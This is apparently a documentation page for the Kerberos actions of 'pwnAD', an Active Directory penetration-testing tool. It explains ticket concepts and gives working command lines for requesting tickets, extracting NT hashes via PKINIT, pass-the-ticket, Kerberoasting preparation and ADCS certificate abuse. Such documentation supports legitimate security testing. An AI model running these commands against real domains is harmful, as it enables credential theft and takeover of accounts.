# Kerberos Overview

pwnAD includes Kerberos operations for obtaining tickets and extracting credentials. These actions work independently of LDAP.

## Available Actions

| Action | Description |
|--------|-------------|
| [getTGT](getTGT.md) | Obtain a Ticket Granting Ticket |
| [getST](getST.md) | Obtain a Service Ticket |
| [getNThash](getNThash.md) | Retrieve NT hash via PKINIT |

## Authentication Methods

Kerberos actions support multiple authentication methods:

| Method | Flags | Availability |
|--------|-------|--------------|
| Password | `-p` | All actions |
| NT Hash | `-H` | All actions |
| AES Key | `--aes-key` | All actions |
| ccache | `-k` | getST only |
| Certificate (PKINIT) | `-pfx` or `-cert -key` | All actions |

## Kerberos Basics

### Ticket Granting Ticket (TGT)

A TGT proves you've authenticated to the domain. It's used to request Service Tickets.

```
Client → KDC: AS-REQ (authentication request)
KDC → Client: AS-REP (TGT)
```

### Service Ticket (ST)

A Service Ticket grants access to a specific service (e.g., CIFS, HTTP, LDAP).

```
Client → KDC: TGS-REQ (with TGT, requesting service)
KDC → Client: TGS-REP (Service Ticket)
```

### PKINIT

PKINIT (Public Key Cryptography for Initial Authentication) uses X.509 certificates instead of passwords for Kerberos authentication. This enables:

- Certificate-based TGT requests
- NT hash extraction via PAC_CREDENTIAL_INFO

## Credential Cache (ccache)

Tickets are stored in credential cache files (`.ccache`). Set the `KRB5CCNAME` environment variable to use them:

```bash
export KRB5CCNAME=/tmp/administrator.ccache
```

## Connection Options

| Option | Description |
|--------|-------------|
| `--dc-ip` | IP address of the KDC (usually the DC) |
| `--kdcHost` | FQDN of the KDC |
| `-d, --domain` | Domain FQDN (REALM) |
| `-u, --user` | Username (without domain) |

## Workflow Examples

### Standard Authentication Flow

```bash
# Get TGT
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' getTGT
[*] Saving ticket in admin.ccache

# Use TGT to get Service Ticket
export KRB5CCNAME=admin.ccache
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -k getST -spn cifs/dc01.domain.local
[*] Saving ticket in admin@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache
```

### Certificate-Based Flow (PKINIT)

```bash
# Get TGT with certificate
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getTGT
[*] Saving ticket in admin.ccache

# Extract NT hash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getNThash
[*] Got NThash for admin: 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Common Use Cases

### Pass-the-Ticket

Use an existing TGT/ST for authentication:

```bash
export KRB5CCNAME=/tmp/admin.ccache
smbclient.py -k -no-pass domain.local/administrator@dc01.domain.local
```

### Kerberoasting Preparation

Get a TGT first, then request service tickets for cracking:

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' getTGT
export KRB5CCNAME=lowpriv.ccache
GetUserSPNs.py -k -no-pass -dc-ip 192.168.1.10 domain.local/lowpriv
```

### Certificate Abuse (ESC1, etc.)

After obtaining a certificate through ADCS abuse:

```bash
# Use certificate to get TGT
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getTGT

# Or directly get NT hash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getNThash
```
